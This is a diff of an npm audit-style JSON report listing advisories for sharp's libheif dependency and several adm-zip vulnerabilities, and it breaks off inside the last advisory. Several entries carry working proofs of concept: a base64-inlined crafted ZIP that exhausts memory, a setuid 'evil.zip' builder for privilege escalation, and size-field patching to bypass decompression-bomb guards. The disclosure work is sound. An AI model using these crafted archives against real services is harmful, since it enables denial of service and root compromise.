+      "overview": "### Impact\nA number of vulnerabilities, two rated as \"Critical\" severity using CVSSv3, have been discovered and fixed in the upstream libheif dependency. These can lead to possible remote code execution (RCE) on glibc-based Linux when run under certain conditions.\n\nThe attack vector for these claims to be \"network\" however sharp does not provide any networking features so this vulnerability is down-rated to a \"High\" severity using CVSSv4 but please note its Subsequent System Impact.\n\nThose processing untrusted input with versions of sharp prior to 0.35.4 are affected.\n\n### Patches\n\n#### Using prebuilt binaries provided by sharp?\n\nMost people rely on the prebuilt binaries provided by sharp.\n\nPlease upgrade sharp to the latest version, currently 0.35.4, which provides libheif 1.23.2.\n\n#### Using a globally-installed libheif?\n\nPlease ensure you are using the latest libheif 1.23.2.\n\n### Workarounds\nAdd the following to your code to prevent sharp from decoding AVIF images.\n```js\nsharp.block({ operation: [\"VipsForeignLoadHeif\"] });\n```\n\nEnsure you are using a `node` executable binary compiled as a Position Independent Executable (PIE). Most Linux package managers already do this for protection against RCE however be warned that the \"official\" Node.js binaries do not.\n\n### References\n- [CVE-2026-84383](https://github.com/strukturag/libheif/security/advisories/GHSA-g89c-p67h-r497)\n- https://github.com/strukturag/libheif/security/advisories/GHSA-2jg2-4ch7-h545",
+      "reported_by": null,
+      "title": "sharp: Vulnerabilities in libheif: GHSA-g89c-p67h-r497 and GHSA-2jg2-4ch7-h545",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "high",
+      "module_name": "sharp",
+      "vulnerable_versions": "<0.35.4",
+      "github_advisory_id": "GHSA-rgj7-g3m4-5g8c",
+      "recommendation": "Upgrade to version 0.35.4 or later",
+      "patched_versions": ">=0.35.4",
+      "updated": "2026-09-08T21:25:12.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-122"
+      ],
+      "url": "https://github.com/advisories/GHSA-rgj7-g3m4-5g8c"
+    },
+    "1193734": {
+      "findings": [
+        {
+          "version": "0.5.17",
+          "paths": [
+            "apps__macos>@huggingface/transformers>onnxruntime-node>adm-zip"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2026-76845\n- https://github.com/cthackers/adm-zip\n- https://github.com/cthackers/adm-zip/blob/v0.6.0/util/utils.js\n- https://www.vulncheck.com/advisories/adm-zip-through-arbitrary-file-overwrite-via-symlink-following-on-extraction\n- https://github.com/cthackers/adm-zip/issues/574\n- https://github.com/cthackers/adm-zip/pull/575\n- https://github.com/advisories/GHSA-vwc7-r8mq-g2x9",
+      "created": "2026-08-24T15:31:51.000Z",
+      "id": 1193734,
+      "npm_advisory_id": null,
+      "overview": "adm-zip 0.5.9 through 0.6.0 follows symbolic links at the extraction destination. Utils.sanitize in util/utils.js enforces containment by comparing only the string form of an archive entry name against the resolved extraction root, and Utils.writeFileTo opens the computed destination with fs.openSync(path, \"w\", 0o666), which resolves symbolic links and carries neither O_NOFOLLOW nor a pre-write fs.lstatSync check. When a path component at the destination already exists as a symbolic link pointing outside the extraction root, extractAllTo, extractAllToAsync and extractEntryTo write the entry contents through that link and then chmod its target, placing attacker-controlled content in a file outside the root without any traversal sequence appearing in the archive. Reaching the write requires overwrite to be enabled, because the preceding fs.existsSync check also resolves the link and otherwise declines. An attacker able to create a symbolic link inside a shared, reused or predictable extraction directory, such as a temporary directory or a continuous integration workspace, can overwrite any file the extracting process is permitted to write.",
+      "reported_by": null,
+      "title": "adm-zip extraction follows destination symlinks, allowing arbitrary file overwrite",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-76845"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "adm-zip",
+      "vulnerable_versions": ">=0.5.9 <=0.6.0",
+      "github_advisory_id": "GHSA-vwc7-r8mq-g2x9",
+      "recommendation": "None",
+      "patched_versions": "<0.0.0",
+      "updated": "2026-09-08T21:20:42.000Z",
+      "cvss": {
+        "score": 6.5,
+        "vectorString": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:N/I:H/A:N"
+      },
+      "cwe": [
+        "CWE-59"
+      ],
+      "url": "https://github.com/advisories/GHSA-vwc7-r8mq-g2x9"
+    },
+    "1239030": {
+      "findings": [
+        {
+          "version": "0.5.17",
+          "paths": [
+            "apps__macos>@huggingface/transformers>onnxruntime-node>adm-zip"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/cthackers/adm-zip/security/advisories/GHSA-7q85-xj36-vmfc\n- https://github.com/cthackers/adm-zip/commit/491600683dacb6cb9fe0718a0eeb9cb5eb49afa6\n- https://github.com/cthackers/adm-zip/releases/tag/v0.6.1\n- https://github.com/advisories/GHSA-7q85-xj36-vmfc",
+      "created": "2026-09-18T17:18:01.000Z",
+      "id": 1239030,
+      "npm_advisory_id": null,
+      "overview": "### Summary\nadm-zip allocates an entry's output buffer from the declared uncompressed size (central-directory `size` field) before validating it against the actual data. A tiny crafted ZIP that declares a huge uncompressed size forces a multi-gigabyte allocation from a few bytes.\n\n### Impact\nOn adm-zip 0.5.17 (latest), Node 24, a 105-byte ZIP with one stored entry declaring size = 1,774,399,200 makes `new AdmZip(buf).getEntries()[0].getData()` commit ~1.8 GB of resident memory in ~4.4 s before throwing `Error: ADM-ZIP: CRC32 checksum failed`, roughly 16 million times the input size. Because the buffer is committed before any validation, on a memory-constrained host (containers, serverless, small VMs) the allocation OOM-kills the process before the CRC check (uncatchable), and concurrent requests can exhaust memory even on larger hosts. Any service that reads entries from untrusted ZIPs is exposed to a remote denial of service.\n\n### Steps to reproduce\nAttachments are not supported in the advisory form, so the 105-byte PoC (sha256 `980d34356fbb248fe527b9d0ac3eabc5c99393a374014be6199523de16709386`) is inlined as base64 in this self-contained reproducer:\n\n```js\nconst AdmZip = require('adm-zip');\n// 105-byte crafted ZIP, base64-inlined\n// sha256 980d34356fbb248fe527b9d0ac3eabc5c99393a374014be6199523de16709386\nconst b64 = \"UEsDBBQAAAAAAAAAAAAAAAAABQAAAAUAAAABAAAAYWhlbGxvUEsBAhQAFAAAAAAAAAAAAAAAAAAFAAAA4C7DaQEAAAAAAAAAAAAAAAAAAAAAAGFQSwUGAAAAAAEAAQAvAAAAJAAAAAAA\";\nconst buf = Buffer.from(b64, \"base64\");          // 105 bytes\nconst zip = new AdmZip(buf);\nzip.getEntries()[0].getData();   // commits ~1.8 GB, then throws \"ADM-ZIP: CRC32 checksum failed\"\n```\n\nThe single entry declares uncompressed size = 1,774,399,200 with a compressed size of 5. `getData()` allocates the full declared size before the CRC check runs, so the memory is committed regardless of the (tiny) actual payload.\n\n### Root cause\n`zipEntry.js` does `Buffer.alloc(<declared uncompressed size>)` before checking the declared size against the compressed size / available bytes.\n\n### Suggested fix\nValidate the declared uncompressed size against the compressed size and a configurable maximum before allocating (yauzl, for example, requires the caller to bound this); reject or stream when the declared size is implausible relative to the input. Happy to send a patch.",
+      "reported_by": null,
+      "title": "adm-zip: Uncontrolled memory allocation via the declared uncompressed size (DoS)",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-77301"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "adm-zip",
+      "vulnerable_versions": "<0.6.1",
+      "github_advisory_id": "GHSA-7q85-xj36-vmfc",
+      "recommendation": "Upgrade to version 0.6.1 or later",
+      "patched_versions": ">=0.6.1",
+      "updated": "2026-09-18T17:18:03.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-789"
+      ],
+      "url": "https://github.com/advisories/GHSA-7q85-xj36-vmfc"
+    },
+    "1240032": {
+      "findings": [
+        {
+          "version": "0.5.17",
+          "paths": [
+            "apps__macos>@huggingface/transformers>onnxruntime-node>adm-zip"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/cthackers/adm-zip/security/advisories/GHSA-rcw4-f5rp-g42v\n- https://github.com/cthackers/adm-zip/commit/491600683dacb6cb9fe0718a0eeb9cb5eb49afa6\n- https://github.com/cthackers/adm-zip/releases/tag/v0.6.1\n- https://github.com/advisories/GHSA-rcw4-f5rp-g42v",
+      "created": "2026-09-29T18:25:20.000Z",
+      "id": 1240032,
+      "npm_advisory_id": null,
+      "overview": "**Affected package:** adm-zip (npm)\n**Affected version:** 0.6.0\n\n## Summary\n\nThe fix shipped for CVE-2026-39244 (`methods/inflater.js`) caps zlib's decompression output via `maxOutputLength: expectedLength`, where `expectedLength` is read directly from the ZIP entry's attacker-controlled \"uncompressed size\" header field (`CENLEN`/`LOCLEN`). This cap is only applied when `expectedLength > 0`:\n\n```js\nconst option = version >= 15 && expectedLength > 0 ? { maxOutputLength: expectedLength } : {};\nreturn zlib.inflateRawSync(inbuf, option);\n```\n\nIf an attacker sets the declared uncompressed-size field to exactly **0**, this condition is false, `option` becomes `{}`, and no output cap is passed to zlib at all. Node then falls back to zlib's own internal default limit (several GB), so a small, highly-compressible payload can still be decompressed to a very large size in memory -- the same class of resource-exhaustion issue the original CVE addressed, just triggered differently.\n\n## Steps to Reproduce\n\n1. Build a ZIP archive containing one DEFLATE-compressed entry whose real content is highly redundant (e.g. several MB of a repeated byte, achieving close to the ~1032:1 theoretical raw-DEFLATE compression ratio).\n2. Patch the entry's declared uncompressed-size fields (both the local file header copy and the central directory copy, 4-byte little-endian values) to `0`. The compressed bytes and CRC32 are left untouched -- CRC validation still passes because CRC is computed over the real decompressed output, not the declared size.\n3. Load the archive with `new AdmZip(buffer)` and call `.getEntries()[0].getData()` (or `readFile`/`readAsText`/`extractAllTo`/etc. -- all share the same code path).\n4. Observe: decompression succeeds and returns the full-size buffer with no size restriction applied, whereas the same real data with an honest (but undersized) declared value correctly throws `Cannot create a Buffer larger than N bytes`.\n\n## Proof of Concept\n\nAttached script demonstrates a controlled A/B comparison using the identical real payload in both cases -- only the declared-size header field differs:\n\n- **Control** (declared size = 1024 bytes, deliberately smaller than the true 4MB output): correctly throws, proving the cap mechanism works when `expectedLength > 0`.\n- **Bypass** (declared size = 0, identical real payload): succeeds and returns the full 4,194,304-byte buffer with zero restriction.\n\nVerified reproducible across 3 independent runs.\n\n## Impact\n\nAny application that calls adm-zip's read/extract methods on an untrusted ZIP file (upload handlers, CI artifact extraction, email attachment scanning, etc.) can be made to allocate an amount of memory bounded only by zlib's own internal default rather than any limit the application or adm-zip intends -- a small (tens-of-MB) upload can trigger multi-GB memory consumption, risking process crash/OOM.\n\n## Suggested Fix\n\nApply `maxOutputLength` unconditionally (e.g. defaulting to a sane absolute ceiling, or always passing the declared size regardless of whether it's 0), and/or add an independent compression-ratio check that doesn't rely solely on the attacker-supplied size field.",
+      "reported_by": null,
+      "title": "adm-zip: Decompression-bomb protection (fix for CVE-2026-39244) can be bypassed by declaring uncompressed size as 0",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "high",
+      "module_name": "adm-zip",
+      "vulnerable_versions": "<=0.6.0",
+      "github_advisory_id": "GHSA-rcw4-f5rp-g42v",
+      "recommendation": "Upgrade to version 0.6.1 or later",
+      "patched_versions": ">=0.6.1",
+      "updated": "2026-09-29T18:25:21.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-409"
+      ],
+      "url": "https://github.com/advisories/GHSA-rcw4-f5rp-g42v"
+    },
+    "1240034": {
+      "findings": [
+        {
+          "version": "0.5.17",
+          "paths": [
+            "apps__macos>@huggingface/transformers>onnxruntime-node>adm-zip"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/cthackers/adm-zip/security/advisories/GHSA-j5f4-cc29-5x44\n- https://github.com/cthackers/adm-zip/commit/6a63c339b83c52915483efacda517660a7a7bf87\n- https://github.com/cthackers/adm-zip/releases/tag/v0.6.1\n- https://github.com/advisories/GHSA-j5f4-cc29-5x44",
+      "created": "2026-09-29T18:24:57.000Z",
+      "id": 1240034,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\nadm-zip applies the Unix permission bits stored in a zip entry directly to the extracted file via `fs.chmodSync()` when `keepOriginalPermission=true` is passed to `extractAllTo()`/`extractEntryTo()` — and it never filters the setuid/setgid/sticky bits out of those bits. A zip crafted by an attacker can therefore produce an extracted binary with mode `04755`. When extraction runs as root (the default posture in Docker builds, CI runners, and privileged install steps — the exact environments where this flag is used), the resulting root-owned setuid file is executed later by a lesser-privileged user, turning the attacker's code into a root execution.\n\n## Details\n\nThe mode a zip entry wants is read back from the external file attributes in the header, and the mask used keeps every special bit:\n\n```js\n// headers/entryHeader.js:187\nget fileAttr() {\n    return (_attr || 0) >> 16 & 0xfff;\n}\n```\n\n`0xfff` is `0o7777` — it preserves setuid (`0o4000`), setgid (`0o2000`) and the sticky bit (`0o1000`) along with the rwx bits. Shifting by 16 is the standard Unix convention for where zip stores the mode; the mask is the problem.\n\nWhen the flag is on, that value goes straight to the write:\n\n```js\n// adm-zip.js:726-727 (extractEntryTo, and identically in extractAllTo)\nconst fileAttr = keepOriginalPermission ? entry.header.fileAttr : undefined;\nfiletools.writeFileTo(target, content, overwrite, fileAttr);\n```\n\n```js\n// util/utils.js:94\nself.fs.chmodSync(path, attr || 0o666);\n```\n\nNo `& 0o777`, no stripping of `0o7000`. Attacker-controlled bytes in the zip decide the final mode of a file the library creates on disk. Directory entries are affected too (`adm-zip.js:855`), so a setgid bit on a directory entry also carries over and gives new files inside it group inheritance.\n\n## PoC\n\nTested against adm-zip@0.6.0 (latest as of 2026-08-01), Node 22, Linux.\n\n1. Craft a zip with a setuid binary using standard tooling (this is the\n   realistic attacker path — no adm-zip APIs involved in creating it):\n\n```bash\npython3 -c \"\nimport zipfile\nzi = zipfile.ZipInfo('pysuidbin')\nzi.external_attr = 0o4755 << 16\nwith zipfile.ZipFile('evil.zip', 'w') as z:\n    z.writestr(zi, '#!/bin/sh\\nid\\n')\n\"\n```\n\n2. Extract with the flag enabled:\n\n```js\nconst AdmZip = require('adm-zip');\nnew AdmZip('evil.zip').extractAllTo('/tmp/out', true, true);\n\nconst fs = require('fs');\nconst st = fs.statSync('/tmp/out/pysuidbin');\nconsole.log((st.mode & 0o7777).toString(8));\n// => 4755   (setuid bit set — the file is root-owned if the extractor runs as root)\n```\n\n3. Control — same zip, default extraction (`keepOriginalPermission=false`):\n   mode comes out `0666`, no setuid. The flag is the enabler.\n\nAlternative supply path, if the zip is built in-process with adm-zip's own API:\n\n```js\nconst zip = new AdmZip();\nzip.addFile('suidbin', Buffer.from('#!/bin/sh\\nid\\n'), '', 0o4755);\nzip.writeZip('evil.zip');\nnew AdmZip('evil.zip').extractAllTo('/tmp/out', true, true);\n// same result: stat mode & 0o7777 === 0o4755\n```\n\n## Impact\n\nPrivilege escalation. \nThe vulnerability class is CWE-732 (incorrect permission assignment): permission bits taken from untrusted input are applied with no filtering.\n\nRealistic chain:\n\n1. Attacker supplies a zip (upload endpoint, fetched dependency archive, artifact in a build script — no special access needed to produce the file).\n2. A pipeline or service extracts it as root with `keepOriginalPermission=true`. Docker builds run as root by default and CI/install steps commonly do too; this flag is specifically the tooling used in permission-preserving deploy flows.\n3. The root-owned setuid file leaves the build, typically preserved by  `cp -a`/rsync mode-bit propagation, into the runtime environment.\n4. An unprivileged app user or service account executes it (the standard build-as-root/run-as-user model) — the attacker's code runs as root.\n\nWho is impacted: applications and pipelines that extract untrusted archives with `keepOriginalPermission=true` while running as root. \nDefault-usage deployments (flag off) are not affected; non-root extraction results in a harmless self-owned setuid file. \nSeverity: Medium\n\nSuggested fix, one line in the getter:\n\n```js\nget fileAttr() {\n    return (_attr >> 16) & 0o777;\n}\n```",
+      "reported_by": null,
+      "title": "adm-zip extraction preserves SUID/SGID bits from untrusted ZIPs -> local privilege escalation",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-102282"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "adm-zip",
+      "vulnerable_versions": "<=0.6.0",
+      "github_advisory_id": "GHSA-j5f4-cc29-5x44",
+      "recommendation": "Upgrade to version 0.6.1 or later",
+      "patched_versions": ">=0.6.1",
+      "updated": "2026-09-29T18:25:04.000Z",
+      "cvss": {
+        "score": 7.1,
+        "vectorString": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N"
+      },
+      "cwe": [
+        "CWE-732"
+      ],
+      "url": "https://github.com/advisories/GHSA-j5f4-cc29-5x44"
+    },
+    "1240064": {
+      "findings": [
+        {
+          "version": "0.5.17",
+          "paths": [
+            "apps__macos>@huggingface/transformers>onnxruntime-node>adm-zip"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/cthackers/adm-zip/security/advisories/GHSA-p634-w6r4-rjp2\n- https://github.com/cthackers/adm-zip/commit/05101d47b3b983b705cc3e66fc34366118ba7b99\n- https://github.com/cthackers/adm-zip/releases/tag/v0.6.1\n- https://github.com/advisories/GHSA-p634-w6r4-rjp2",
+      "created": "2026-09-29T23:11:01.000Z",
+      "id": 1240064,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nA ZIP file can contain two entries with the identical name. adm-zip keeps both in its internal entry list, but its name-lookup table only retains the last one written. `getEntry(name)` and `extractAllTo()` walk these two different internal structures, so they can each resolve a duplicate name to a *different* entry. An application that validates a named entry's contents via `getEntry()` before trusting an archive, then extracts the whole archive, can end up approving one file's content while a different file's bytes are what actually land on disk under that name.\n\n### Details\n- `zipFile.js:58-83` retains both entries in `entryList` but overwrites `entryTable[name]` with only the last one written.\n- `adm-zip.js:83-95,658-663` uses `entryTable` for `getEntry()` lookups — returns the *last* duplicate.\n- `adm-zip.js:769-914` iterates `entryList` for extraction — writes the *first* duplicate (sync, default overwrite policy).\n\n\n### PoC\n```js\nconst AdmZip = require('adm-zip');\nconst z = new AdmZip({ noSort: true });\nz.addFile('a.txt', Buffer.from('FIRST'));\nz.addFile('b.txt', Buffer.from('SECOND'));\nconst raw = Buffer.from(z.toBuffer());\n// rename the a.txt entry to b.txt directly in the raw bytes\nfor (let at = raw.indexOf('a.txt'); at >= 0; at = raw.indexOf('a.txt', at + 5)) {\n  raw.write('b.txt', at);\n}\nconst parsed = new AdmZip(raw, { noSort: true });\nconst validated = parsed.getEntry('b.txt').getData().toString();\nparsed.extractAllTo(outDir, false);\n// validated === \"SECOND\", but the file written to disk === \"FIRST\"\n```\n\nReproduced on the pinned commit (`2b4d84087d45344643e0183756e19191d52815cc`)\n\n### Impact\nAn application that checks a named entry's content before trusting an untrusted ZIP, then extracts it, can be made to approve different bytes than what actually gets written to disk — the classic check/use split that this kind of validate-then-extract pattern relies on.",
+      "reported_by": null,
+      "title": "adm-zip: Duplicate ZIP entry names: getEntry() and extractAllTo() resolve to different content",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "adm-zip",
+      "vulnerable_versions": "<=0.6.0",
+      "github_advisory_id": "GHSA-p634-w6r4-rjp2",
+      "recommendation": "Upgrade to version 0.6.1 or later",
+      "patched_versions": ">=0.6.1",
+      "updated": "2026-09-29T23:11:04.000Z",
+      "cvss": {
+        "score": 5.9,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N"
+      },
+      "cwe": [
+        "CWE-436",
+        "CWE-696"
+      ],
+      "url": "https://github.com/advisories/GHSA-p634-w6r4-rjp2"
+    },
+    "1240065": {
+      "findings": [
+        {
+          "version": "0.5.17",
+          "paths": [
+            "apps__macos>@huggingface/transformers>onnxruntime-node>adm-zip"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/cthackers/adm-zip/security/advisories/GHSA-c6fg-446q-cg94\n- https://github.com/cthackers/adm-zip/commit/491600683dacb6cb9fe0718a0eeb9cb5eb49afa6\n- https://github.com/cthackers/adm-zip/releases/tag/v0.6.1\n- https://github.com/advisories/GHSA-c6fg-446q-cg94",
+      "created": "2026-09-29T23:10:32.000Z",
+      "id": 1240065,
+      "npm_advisory_id": null,
+      "overview": "### Summary\nadm-zip enforces a `maxOutputLength` guard against decompression bombs on its synchronous `getData()` path, but the equivalent asynchronous `getDataAsync()` path does not enforce it — it accumulates and returns the entire decompressed output regardless of the entry's declared size. An application that checks an entry's declared size before deciding to process it, then reads the entry via `getDataAsync()` (a completely ordinary, often-recommended choice for I/O in Node.js), gets none of the protection it believes it has.\n\n\n### Details\n\n- `methods/inflater.js:3-10` passes `{maxOutputLength: expectedLength}` to `inflateRawSync`, which Node enforces.\n- `methods/inflater.js:12-31` passes the same option to `createInflateRaw` but never enforces it on the streaming path — it just accumulates every chunk and allocates a final Buffer of whatever size resulted.\n\n\n### PoC\n\n```js\nconst AdmZip = require('adm-zip');\nconst zip = new AdmZip();\nzip.addFile('p', Buffer.alloc(64 * 1024 * 1024, 0x41)); // 64 MiB\nconst raw = Buffer.from(zip.toBuffer());\n// patch the local + central declared uncompressed size to 1 byte\nraw.writeUInt32LE(1, localHeaderSizeOffset);\nraw.writeUInt32LE(1, centralHeaderSizeOffset);\nconst entry = new AdmZip(raw).getEntry('p');\n\nentry.getData();\n// throws: ERR_BUFFER_TOO_LARGE: Cannot create a Buffer larger than 1 bytes\n\nentry.getDataAsync((data, error) => { ... });\n// returns the full 67,108,864-byte buffer, error is undefined\n```\n\n### Impact\nAn application that validates a declared size before reading an entry, then uses the async API, gets no protection against a high-ratio DEFLATE payload. Repeated or larger requests could contribute to memory exhaustion.",
+      "reported_by": null,
+      "title": "adm-zip: getDataAsync() bypasses the maxOutputLength size guard enforced by the synchronous getData() path",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "adm-zip",
+      "vulnerable_versions": "<=0.6.0",
+      "github_advisory_id": "GHSA-c6fg-446q-cg94",
+      "recommendation": "Upgrade to version 0.6.1 or later",
+      "patched_versions": ">=0.6.1",
+      "updated": "2026-09-29T23:10:35.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+      },
+      "cwe": [
+        "CWE-400",
+        "CWE-770"
+      ],
+      "url": "https://github.com/advisories/GHSA-c6fg-446q-cg94"
+    },
+    "1240066": {
+      "findings": [
+        {
+          "version": "0.5.17",
+          "paths": [
+            "apps__macos>@huggingface/transformers>onnxruntime-node>adm-zip"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/cthackers/adm-zip/security/advisories/GHSA-8238-w5pm-2374\n- https://github.com/cthackers/adm-zip/commit/5e70d3a26097d68fa981c41f022c053117174e49\n- https://github.com/cthackers/adm-zip/releases/tag/v0.6.1\n- https://github.com/advisories/GHSA-8238-w5pm-2374",
+      "created": "2026-09-29T23:10:09.000Z",
+      "id": 1240066,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\nDenial of Service in `adm-zip`'s async decompression API allows an unauthenticated attacker to crash the entire Node.js host process by supplying a single malformed ZIP file.\n\n## Details\n\n**Affected package**: adm-zip\n**Affected versions**: at least 0.6.0 (current latest); likely all versions containing the current `inflateAsync` implementation in `methods/inflater.js`\n**Patched version**: 0.6.1\n\n### Root Cause\n\n`methods/inflater.js:12-32` (`inflateAsync`) creates a `zlib.createInflateRaw(option)` stream and feeds it attacker-controlled compressed bytes via `tmp.end(inbuf)`, but never registers an `\"error\"` listener on the stream:\n\n```js\ninflateAsync: function (/*Function*/ callback) {\n    var tmp = zlib.createInflateRaw(option),\n        parts = [],\n        total = 0;\n    tmp.on(\"data\", function (data) { parts.push(data); total += data.length; });\n    tmp.on(\"end\", function () { /* build buf, callback(buf) */ });\n    tmp.end(inbuf);   // no tmp.on(\"error\", ...) registered anywhere\n}\n```\n\nPer Node.js `EventEmitter`/stream semantics, an `\"error\"` event emitted with zero listeners is rethrown as an **uncaught exception on a later tick**, originating from the zlib C++ binding. This cannot be caught by a `try/catch` wrapped around the calling code, because the throw happens asynchronously, outside the synchronous call stack the `try/catch` covers.\n\nThis code path is reached from every public async API that decompresses entry data: `readFileAsync`, `readAsTextAsync`, `extractAllToAsync`, and `ZipEntry.getDataAsync` (`zipEntry.js:51`, `:97-120`, `:309-315`; `adm-zip.js:157-164`, `:192-210`, `:893`).\n\nThis library recently patched **CVE-2026-39244** (GHSA-xcpc-8h2w-3j85), an unbounded `Buffer.alloc()` on the *synchronous* decompression path. That fix added a `maxOutputLength` option to `zlib.inflateRawSync`/`zlib.createInflateRaw`, and the sync path's resulting throw is naturally catchable. The async path shares the same `maxOutputLength` option (`methods/inflater.js:5`) but has no error-handling on the stream at all, so it was not covered by that fix and remains exploitable via either of two independent triggers:\n\n1. A DEFLATE entry with corrupted/malformed compressed bytes (`Z_DATA_ERROR`) — no special crafting needed.\n2. Compressed data whose inflated size exceeds the declared central-directory size, which now trips the `maxOutputLength` guard — but on the stream this surfaces via the unhandled `\"error\"` event rather than a catchable throw.\n\n### Attack Vector\n\n1. Attacker crafts (or corrupts) a ZIP file containing one DEFLATE-compressed entry with invalid/corrupted compressed bytes. Headers, CRC, and offsets can remain fully valid — only the compressed payload bytes need to be malformed.\n2. Victim application accepts this ZIP as an untrusted upload and processes it via any of adm-zip's async APIs, e.g.:\n   ```js\n   const zip = new AdmZip(uploadedBuffer);\n   zip.readFileAsync(zip.getEntries()[0], (data) => { /* ... */ });\n   ```\n3. `inflateAsync` begins decompressing; zlib emits `\"error\"` on `Z_DATA_ERROR`.\n4. No listener exists for that event, so Node rethrows it as an uncaught exception, crashing the entire host process — killing all in-flight requests for every other user/tenant on that process, not just the attacker's own request.\n\n## Impact\n\nAny Node.js service that accepts untrusted ZIP uploads and processes them via adm-zip's async API (the documented, recommended pattern for non-blocking servers) can be crashed by a single unauthenticated request containing one small malicious file. This is a full process-level denial of service, not a per-request error.\n\n## Proof of Concept\n\nAttached: `poc_async_dos.py`. Summary of what it does:\n\n1. Builds a fully valid ZIP using adm-zip's own writer (`new AdmZip(); zip.addFile(...); zip.toBuffer()`), guaranteeing correct headers/CRC/offsets.\n2. Locates the local file header's compressed-data region via its own (untouched) size/offset fields and XORs every byte in that region with `0xFF`, corrupting only the DEFLATE payload.\n3. Parses the corrupted archive with a fresh `new AdmZip(badBuf)` (succeeds — headers are intact) and calls `entries[0].getDataAsync(callback)`, wrapped in `try/catch`, in an isolated child process.\n4. Captures the child's exit code and stderr.\n\nVerified independently 3/3 runs (plus 2 isolating controls: an unmodified zip through the same path does not crash; bare Node `zlib.createInflateRaw()` fed garbage with no error listener reproduces the identical crash outside adm-zip entirely, confirming the root cause is the missing listener, not something else). Representative output:\n\n```\n[*] Child process exit code: 1\n----- Node child process stderr (crash evidence) -----\nnode:events:497\n      throw er; // Unhandled 'error' event\n      ^\nError: invalid distance too far back\n    at genericNodeError (node:internal/errors:983:15)\n    at Zlib.zlibOnError [as onerror] (node:zlib:191:17)\nEmitted 'error' event on InflateRaw instance at:\n    at emitErrorNT (node:internal/streams/destroy:170:8)\n    at emitErrorCloseNT (node:internal/streams/destroy:129:3)\n    at process.processTicksAndRejections (node:internal/process/task_queues:89:21) {\n  errno: -3,\n  code: 'Z_DATA_ERROR'\n}\nNode.js v22.22.1\n--------------------------------------\n[*] Caught by harness's own try/catch (would mean NOT vulnerable): False\n[*] getDataAsync callback ever fired (would mean NOT vulnerable): False\n[*] Child process exited non-zero (crashed): True\n[+] VULNERABILITY CONFIRMED\n```\n\nReproduction: `python3 poc_async_dos.py` (requires python3 and Node.js; tested on Node.js v22.22.1).\n\n## Suggested Fix\n\nRegister an `\"error\"` listener on the `InflateRaw` stream in `methods/inflater.js`'s `inflateAsync`, and route it to the existing `callback`, e.g.:\n\n```js\ninflateAsync: function (/*Function*/ callback) {\n    var tmp = zlib.createInflateRaw(option),\n        parts = [],\n        total = 0;\n    tmp.on(\"data\", function (data) { parts.push(data); total += data.length; });\n    tmp.on(\"error\", function (err) {\n        // surface as a normal async error instead of crashing the process\n        callback(Buffer.alloc(0), err);   // or however this codebase's async\n                                            // error convention is expressed\n    });\n    tmp.on(\"end\", function () { /* existing behavior */ });\n    tmp.end(inbuf);\n}\n```\n\nThe exact callback/error-propagation convention should match the rest of the codebase's async error handling style (a quick look suggests callbacks here are currently success-only; this may need a small signature adjustment or an `err`-first convention, at the maintainer's discretion). The key fix is simply: **never leave a Node.js stream without an `\"error\"` listener when it can plausibly error on attacker-controlled input.**\n\n## Full PoC Source (`poc_async_dos.py`)\n\n```python\n#!/usr/bin/env python3\n\"\"\"\nTested version: adm-zip 0.6.0\nTested on: Linux, Node.js v22.22.1\n\nDescription:\n  methods/inflater.js:12-32 (inflateAsync) creates a\n  zlib.createInflateRaw(option) stream and calls tmp.end(inbuf) without ever\n  registering an \"error\" listener on the stream. Per Node.js EventEmitter\n  semantics, an \"error\" event emitted with zero listeners is rethrown as an\n  uncaught exception -- this happens on a later tick from the zlib C++\n  binding, so it CANNOT be caught by a try/catch wrapped around the calling\n  code. Any code that feeds an untrusted zip file into one of adm-zip's\n  public *Async APIs (readFileAsync, readAsTextAsync, extractAllToAsync,\n  ZipEntry.getDataAsync) crashes the entire host Node.js process the moment\n  it encounters a DEFLATE entry with corrupted/malformed compressed bytes.\n  The synchronous decompression path (getData()) was hardened for\n  CVE-2026-39244 (maxOutputLength + a throw that is naturally catchable);\n  this async streaming path was missed by that fix and remains an\n  unauthenticated, single-request availability bug.\n\nImpact:\n  Any service that accepts untrusted zip uploads and reads/extracts them\n  via adm-zip's async API (the officially documented, recommended usage\n  for non-blocking servers) can be 